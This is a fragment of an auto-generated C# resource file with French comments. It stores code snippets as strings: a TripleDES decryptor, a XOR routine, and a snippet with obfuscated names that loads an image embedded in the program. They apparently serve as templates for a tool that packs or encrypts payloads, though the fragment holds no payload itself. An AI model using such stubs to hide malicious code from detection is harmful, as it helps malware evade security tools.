        ///             TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
        ///                tripleDES.Key = UTF8Encoding.UTF8.GetBytes(Key);
        ///                tripleDES.Mode = CipherMode.ECB;
        ///                tripleDES.Padding = PaddingMode.PKCS7;
        ///                ICryptoTransform cTransform = tripleDES.CreateDecryptor();
        ///                byte[] resultArray = cTransform. [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string TripleDES {
            get {
                return ResourceManager.GetString("TripleDES", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à        public static byte[] XOR(byte[] input, string Key, int amount)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            for (int i = 0; i &lt; input.Length; i++)  input[i] ^= (byte)(key[i % key.Length] &gt;&gt; (i + amount + key.Length) &amp; 255);
        ///            return input;
        ///        }.
        /// </summary>
        internal static string Xor {
            get {
                return ResourceManager.GetString("Xor", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à 		Assembly JJ3 = Assembly.GetExecutingAssembly();  		
        ///		Bitmap AJJ8 = new Bitmap(JJ3.GetManifestResourceStream(&quot;i[RESTOFTHENAME].png&quot;));	.
        /// </summary>
        internal static string YES {
            get {
                return ResourceManager.GetString("YES", resourceCulture);
            }
        }
    }
}
